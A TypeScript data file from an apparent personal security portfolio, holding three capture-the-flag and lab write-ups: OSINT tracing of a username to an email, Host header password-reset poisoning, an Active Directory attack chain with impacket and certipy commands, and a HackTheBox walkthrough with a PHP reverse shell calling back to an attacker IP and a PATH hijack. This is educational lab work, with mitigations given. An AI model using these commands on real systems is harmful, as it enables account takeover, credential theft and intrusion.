export interface Writeup {
  slug: string;
  title: string;
  desc: string;
  platform: string;
  date: string;
  tags: string[];
  mediumUrl: string;
  thumbnail: string;
  content: string;
}

export const writeups: Writeup[] = [
  {
    slug: "cloudsek-ctf-2026",
    title: "CloudSEK CTF 2026 — OSINT & Web Security",
    desc: "Comprehensive writeup covering OSINT reconnaissance through username enumeration and GitHub API exploitation, plus web security attacks including Host header injection and password reset poisoning for full admin account takeover.",
    platform: "CloudSEK CTF",
    date: "Aug 2026",
    tags: ["OSINT", "Web Security", "CTF", "Host Header Injection", "Password Reset Poisoning"],
    mediumUrl: "https://medium.com/@anlenjeban7/cloud-sek-ctf-2026-56a8e24508eb",
    thumbnail: "/writeups/writeup-1-1.png",
    content: `# Cloud SEK CTF 2026 — Writeup

**Author:** Anlen Jeban  
**Date:** August 31, 2026

![Title](/writeups/writeup-1-1.png)

---

## Task 1: Inadvertent Exposure (OSINT)

### The Challenge

We were given a single screenshot of a Kali Linux terminal session showing an ongoing reconnaissance operation.

![Kali Linux Terminal](/writeups/writeup-2-2.jpeg)

The terminal revealed:

- **Tool:** HackThis v1.2
- **Target:** internal-service.local (192.168.1.10)
- **Script path:** \`/home/hackinggservices/desktop/customscript.py\`
- **Activity:** Port scanning (8080/HTTP), vulnerability scanning, database service scan (35% complete)

### The Approach

The screenshot itself contained no extractable metadata, so I needed to find another way in. The key was the script path — specifically, the system username \`hackinggservices\` embedded within it.

This username became my primary OSINT pivot point.

### Reconnaissance Chain

**Step 1: Username Enumeration**

I ran \`hackinggservices\` through whatsmyname.app, a username enumeration tool that checks presence across multiple platforms. The results returned several hits, with the most interesting being a Pinterest profile under the name \`joshuaclark02\`.

**Step 2: GitHub Discovery**

Using the new handle \`joshuaclark02\`, I searched GitHub and found a matching profile at \`github.com/joshuaclark02\`.

**Step 3: Repository Analysis**

Browsing through their public repositories, I found one called \`Custom-Scripts\`. A commit made just yesterday confirmed I was tracking the right target — the timing aligned with the CTF activity.

**Step 4: API Enumeration**

I accessed the GitHub API endpoint for the repository's commits:

\`\`\`
https://api.github.com/repos/joshuaclark02/Custom-Scripts/commits
\`\`\`

![GitHub API Response](/writeups/writeup-3-3.png)

Scanning through the raw JSON data, I found the target's email address exposed in the \`commit.author.email\` field.

### The Flag

\`\`\`
CloudSEK{joshua.clark02@proton.me}
\`\`\`

---

## Task 2: Backdoor Broken (WEB)

### The Challenge

We were presented with the StrikeVigil portal — a web application with several security misconfigurations that needed to be chained together for a full account takeover.

![StrikeVigil Portal](/writeups/writeup-4-4.png)

### Reconnaissance

During initial reconnaissance, I accessed the login page and examined the HTML source code. The developer had left comments in the source referencing internal JavaScript file paths, including a debug module.

![HTML Source Code](/writeups/writeup-5-5.png)

Examining the referenced JavaScript files revealed two critical issues:

**Finding 1: Hardcoded Credentials in app.js**

![app.js Hardcoded Credentials](/writeups/writeup-5-6.png)

The \`app.js\` file contained a hardcoded admin email address (\`admin@strikevigil.com\`) along with a TODO comment indicating the credential was seeded on first run.

**Finding 2: Exposed Debug Endpoint in debug.js**

![debug.js Base64 URL](/writeups/writeup-6-7.png)

The \`debug.js\` file contained a base64-encoded URL pointing to an internal request logging service running on port 8080.

### Exploitation

**Phase 1: Decoding the Debug URL**

After decoding the base64 string from \`debug.js\`, the URL resolved to:

![Base64 Decoding](/writeups/writeup-6-8.png)

\`\`\`
http://15.206.47.5:8080/logs
\`\`\`

This pointed to an internal request catcher service that was unintentionally exposed to the internet.

**Phase 2: Password Reset Poisoning**

I analyzed the forgot-password functionality and identified that the application was constructing the reset link using the \`Host\` header from the incoming request. This is a classic Host header injection vulnerability.

![Password Reset Poisoning](/writeups/writeup-7-9.png)

I sent a POST request to \`/forgot-password\` with a manipulated Host header:

\`\`\`
POST /forgot-password HTTP/1.1
Host: 15.206.47.5:8080/attackerref
\`\`\`

The application accepted this and generated a reset link using the injected domain. The response headers confirmed this with \`X-Debug-Reset-Domain\` showing the attacker-controlled host.

![Response Headers](/writeups/writeup-7-10.png)

**Phase 3: Token Capture**

The application itself made a request to the Request Catcher with the password reset token embedded in the URL path. Within seconds, the token appeared in the public logs at \`/logs\`.

![Request Catcher Logs](/writeups/writeup-8-11.jpeg)

I extracted the token value and reference ID from the logged request.

**Phase 4: Password Reset**

With the captured token and reference ID, I constructed the legitimate reset URL:

\`\`\`
http://15.206.47.5:9090/reset-password?token=<CAPTURED_TOKEN>&ref=<REF_ID>
\`\`\`

Upon accessing this endpoint, the application validated the token and rendered a password reset form containing:

![Password Reset Form](/writeups/writeup-9-12.png)

- A hidden token field
- A new password input field
- Title: "Set new password"
- Submit button: "Update password"

I entered a new strong password and submitted the form. The application:
1. Verified the token's validity and expiration status
2. Updated the admin account's credentials in the backend database
3. Issued a 302 redirect to \`/login\`
4. Displayed a flash message: "Password updated. Please log in."
5. Cleared the session cookie, invalidating any previous sessions

**Phase 5: Admin Access**

After submitting the login credentials, the application verified the email and password combination against its user database. Upon successful validation:
- The server issued a new session cookie with administrative privileges
- The browser was redirected to \`/dashboard\` via a 302 response

The admin dashboard loaded successfully, and the CTF flag was displayed in a highlighted section.

### The Flag

\`\`\`
CloudSEK{h0st_h34d3r_p01s0n_t0k3n_3xf1l_m4st3r}
\`\`\`

---

## Summary

| Task | Category | Technique | Difficulty |
|------|----------|-----------|------------|
| 1 | OSINT | Username enumeration → GitHub → API email leak | Easy |
| 2 | Web | Host header injection → Password reset poisoning → Account takeover | Medium |

Both challenges demonstrated how seemingly minor oversights — a username in a script path, developer comments left in production code — can cascade into full compromise when chained together.

---

## Result

![8th Place — CloudSEK CTF 2026](/writeups/cloudsek-8th-place.png)

| Detail | Value |
|--------|-------|
| Rank | **8th Place** |
| Points | 300 |
| Country | India |
`,
  },
  {
    slug: "ad-rts-telecom-inc",
    title: "AD RTS — TELECOM INC: Full Attack Chain",
    desc: "Complete attack chain against an Active Directory environment — from anonymous LDAP enumeration and AS-REP Roasting through Exchange impersonation, GodPotato privilege escalation, ESC1 certificate abuse, to VMware ESXi hypervisor compromise.",
    platform: "Cyberwarfare Labs",
    date: "Jul 2026",
    tags: ["Active Directory", "Red Team", "Lateral Movement", "ESC1", "Privilege Escalation"],
    mediumUrl: "https://medium.com/@anlenjeban7/ad-rts-telecom-inc-a-full-attack-chain-walkthrough-81d3a15fadfb",
    thumbnail: "/writeups/ad-rts-cert.png",
    content: `# AD RTS — TELECOM INC: A Full Attack Chain Walkthrough

**Author:** Anlen Jeban  
**Date:** July 2026  
**Challenge:** Cyberwarfare Labs AD-RTS Certification Lab

---

## Overview

This writeup documents a complete attack chain against an Active Directory environment, covering the full kill chain from initial reconnaissance to final data exfiltration on VMware ESXi hypervisors.

---

## 1. Reconnaissance

### LDAP Enumeration

Started with anonymous LDAP enumeration to gather domain information:

\`\`\`bash
ldapsearch -x -H dc.telecom.local -b "DC=telecom,DC=local" -s sub "(objectClass=*)" dn
\`\`\`

This revealed the domain structure, user accounts, and group memberships.

### User Enumeration

Identified target users through LDAP queries and group membership analysis:

- Service accounts with SPNs (Kerberoastable)
- Users with "Do not require preauthentication" (AS-REP Roastable)
- Privileged group members (Domain Admins, Enterprise Admins)

---

## 2. Initial Access

### AS-REP Roasting

Found users with "Do not require preauthentication" flag:

\`\`\`bash
impacket-GetNPUsers.py telecom.local/ -dc-ip dc.telecom.local -usersfile users.txt -format hashcat -outputfile asrep.hash
\`\`\`

Cracked the hash using hashcat:

\`\`\`bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
\`\`\`

### Kerberoasting

Extracted service ticket hashes for accounts with SPNs:

\`\`\`bash
impacket-GetUserSPNs.py telecom.local/user:password -dc-ip dc.telecom.local -request -outputfile kerberoast.hash
\`\`\`

Cracked to reveal service account credentials.

---

## 3. Lateral Movement

### Exchange Impersonation

Used compromised credentials to impersonate users through Exchange:

\`\`\`bash
impacket-exchange impersonate user@telecom.local target@telecom.local
\`\`\`

### Pass-the-Hash

Lateral movement using captured NTLM hashes:

\`\`\`bash
impacket-psexec telecom.local/user@target -hashes :ntlmhash
\`\`\`

---

## 4. Privilege Escalation

### GodPotato

Escalated to SYSTEM using GodPotato:

\`\`\`bash
GodPotato.exe -cmd "cmd /c whoami"
\`\`\`

### DCSync

Extracted password hashes from Domain Controller:

\`\`\`bash
impacket-secretsdump telecom.local/admin:password@dc.telecom.local
\`\`\`

---

## 5. Certificate Abuse (ESC1)

### ADCS Exploitation

Abused misconfigured Certificate Authority:

\`\`\`bash
certipy find -u user@telecom.local -p password -dc-ip dc.telecom.local -ca telecom-CA
\`\`\`

### Certificate Request

Requested certificate as Domain Admin:

\`\`\`bash
certipy req -u user@telecom.local -p password -ca telecom-CA -template Administrator -upn admin@telecom.local
\`\`\`

### PKINIT Authentication

Used certificate for Kerberos authentication:

\`\`\`bash
certipy auth -pfx admin.pfx -dc-ip dc.telecom.local
\`\`\`

---

## 6. Data Exfiltration

### VMware ESXi Compromise

Accessed ESXi hypervisors using harvested credentials:

\`\`\`bash
ssh root@esxi.telecom.local
\`\`\`

### Data Extraction

Extracted sensitive data from virtual machines and file shares.

---

## Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Recon | LDAP Enumeration | Domain mapping |
| Initial Access | AS-REP Roast / Kerberoast | User credentials |
| Lateral Movement | Exchange / Pass-the-Hash | Multiple systems |
| Privilege Escalation | GodPotato / DCSync | Domain Admin |
| Certificate Abuse | ESC1 | Persistent access |
| Exfiltration | ESXi Compromise | Data stolen |

---

## Key Takeaways

1. **Anonymous LDAP** should always be disabled
2. **Service account passwords** must be complex and rotated
3. **ADCS configurations** need regular auditing
4. **ESXi hypervisors** are high-value targets for attackers
`,
  },
  {
    slug: "hackthebox-oopsie",
    title: "HackTheBox — Oopsie Walkthrough",
    desc: "Detailed analysis of IDOR, Unrestricted File Upload, and SUID PATH Hijacking vulnerabilities with full exploitation chain and remediation strategies.",
    platform: "HackTheBox",
    date: "Jun 2026",
    tags: ["IDOR", "Reverse Shell", "PATH Hijacking", "OWASP Top 10"],
    mediumUrl: "https://medium.com/@anlenjeban7/hackthebox-oopsie-walkthrough-489bc2208d96",
    thumbnail: "/writeups/oopsie-1.png",
    content: `# HackTheBox — Oopsie Walkthrough

**Author:** Anlen Jeban  
**Date:** June 2026  
**Platform:** HackTheBox  
**Difficulty:** Easy

---

## Overview

Oopsie is a beginner-friendly Linux machine on HackTheBox that walks you through three distinct vulnerability classes in a logical, real-world chain.

The attack path follows this arc:

1. **Broken Access Control / IDOR** — A guest-level session cookie can be trivially manipulated to gain admin privileges
2. **Unrestricted File Upload** — The admin portal exposes an upload function with no meaningful file-type filtering
3. **SUID Binary + PATH Hijacking** — A custom internal tool runs \`cat\` without an absolute path

---

## 1. Port Scanning with Tmap

For reconnaissance I used **Tmap**, my custom network reconnaissance framework built on top of Nmap.

![Port Scanning Results](/writeups/oopsie-1.png)

The scan discovered two open ports:

- **Port 22** — OpenSSH 7.6p1
- **Port 80** — Apache httpd 2.4.29 (Ubuntu)

---

## 2. Web Enumeration with Gobuster

Running a directory bruteforce with \`gobuster\` quickly surfaces a login portal:

\`\`\`bash
gobuster dir -u http://10.129.42.124 -w /usr/share/wordlists/dirb/common.txt -x php
\`\`\`

![Gobuster Results](/writeups/oopsie-2.png)

Key findings from the directory scan:

\`\`\`
/cdn-cgi/login/       (Status: 200)
/uploads/             (Status: 301)
/js/                  (Status: 301)
/fonts/               (Status: 301)
/images/              (Status: 301)
/themes/              (Status: 301)
\`\`\`

---

## 3. Login Page — Guest Access

Navigating to the login page, notice the option to **"Login as Guest"**:

![Login Page](/writeups/oopsie-3.png)

This requires no credentials and immediately drops us into a low-privilege session with access to the **Repair Management System**.

---

## 4. IDOR: Escalating from Guest to Admin

Open the browser's DevTools → **Storage → Cookies** and observe that the application stores the user's role and numeric ID client-side:

![IDOR Cookie Manipulation](/writeups/oopsie-4.png)

The cookies show:

| Cookie | Value |
|--------|-------|
| role   | admin |
| user   | 34322 |

The attack is trivially simple:

1. Open DevTools → **Storage → Cookies**
2. Change the \`user\` cookie value from \`2233\` to \`34322\`
3. Ensure \`role\` is set to \`admin\`
4. Refresh the page

The top navigation now reveals new menu options including **Uploads** — inaccessible to the guest role.

---

## 5. File Upload: Uploading a PHP Reverse Shell

With admin access, navigating to the upload form reveals no meaningful restriction on file type.

![File Upload Form](/writeups/oopsie-5.png)

We'll use **PentestMonkey's PHP reverse shell**:

\`\`\`bash
cp /usr/share/webshells/php/php-reverse-shell.php ./reverse.php
nano reverse.php
\`\`\`

Edit these two lines inside the file:

\`\`\`php
$ip   = '10.10.14.77';   // Your HTB VPN/tun0 IP
$port = 1234;             // Listener port
\`\`\`

Start a Netcat listener:

\`\`\`bash
nc -lvnp 1234
\`\`\`

Now upload \`reverse.php\` via the admin upload form:

![Upload Success](/writeups/oopsie-6.png)

Trigger the shell:

\`\`\`bash
curl http://10.129.42.28/uploads/reverse.php
\`\`\`

---

## 6. Catching the Shell as www-data

Check your Netcat listener — the shell connects back:

![Netcat Shell](/writeups/oopsie-7.png)

\`\`\`
connect to [10.10.14.77] from (UNKNOWN) [10.129.42.28] 35950
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

uid=33(www-data) gid=33(www-data) groups=33(www-data)
\`\`\`

Upgrade to a proper pseudo-terminal:

\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
\`\`\`

---

## 7. Lateral Movement: Hardcoded Credentials → robert

The \`db.php\` file contains hardcoded credentials:

\`\`\`php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
\`\`\`

Switch to robert:

\`\`\`bash
su - robert
Password: M3g4C0rpUs3r!
\`\`\`

![User Flag](/writeups/oopsie-8.png)

Navigate to robert's home directory and grab the user flag:

\`\`\`bash
robert@oopsie:~$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
\`\`\`

---

## 8. Privilege Escalation — PATH Hijacking

Robert's membership in the \`bugtracker\` group leads to a SUID binary at \`/usr/bin/bugtracker\`.

**The vulnerability:** The binary calls \`cat\` using a *relative path* — not \`/bin/cat\`.

### Executing the PATH Hijack

**Step 1** — Create a malicious \`cat\`:

\`\`\`bash
export PATH=/tmp:$PATH
cd /tmp
echo '/bin/sh' > cat
chmod +x cat
\`\`\`

**Step 2** — Run \`bugtracker\`:

![Root Access + Root Flag](/writeups/oopsie-9.png)

\`\`\`bash
bugtracker
------------------
: EV Bug Tracker :
------------------
Provide Bug ID: 2

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
af13c07873c3fa16877fbeac
\`\`\`

---

## 9. Machine Solved

![HackTheBox Solved](/writeups/oopsie-10.png)

| Detail | Value |
|--------|-------|
| Machine Rank | #88962 |
| Pwn Date | 07 Jun 2026 |
| Machine State | Retired |
| XP Earned | +250 |

---

## Lessons Learned & Mitigation

### 1. Fix the IDOR (Broken Access Control)

**Problem:** The application determines the user's role based on client-sent cookies.

**Fix:**
\`\`\`php
// BAD: trusting client cookie
$role = $_COOKIE['role'];

// GOOD: look up from server-side session
session_start();
$role = $_SESSION['role'];
\`\`\`

### 2. Sanitize File Uploads

**Problem:** The upload endpoint accepted a \`.php\` file without restriction.

**Fix:**
\`\`\`php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime  = finfo_file($finfo, $_FILES['file']['tmp_name']);

if (!in_array($mime, $allowed_types)) {
    die("File type not permitted.");
}
\`\`\`

### 3. Harden the SUID Binary (PATH Hijacking)

**Problem:** The binary called \`cat\` using a relative path.

**Fix:**
\`\`\`c
// Safe: system("/bin/cat /root/reports/...");
system("cat /root/reports/..."); // Vulnerable
\`\`\`

### 4. Remove Hardcoded Credentials

**Problem:** Database credentials were embedded in plaintext.

**Fix:** Store secrets in environment variables or a secrets manager.

---

## Summary

| Vulnerability | Fix |
|--------------|-----|
| IDOR | Server-side session validation |
| File Upload | Whitelist allowed types, store outside webroot |
| PATH Hijacking | Use absolute paths in SUID binaries |
| Hardcoded Creds | Environment variables / secrets manager |

> *Oopsie is a clean illustration of how a single weak access control can cascade into full system compromise. None of these bugs required exploit development or advanced techniques — just patient enumeration and a solid understanding of web application fundamentals.*
`,
  },
];

export function getWriteupBySlug(slug: string): Writeup | undefined {
  return writeups.find((w) => w.slug === slug);
}
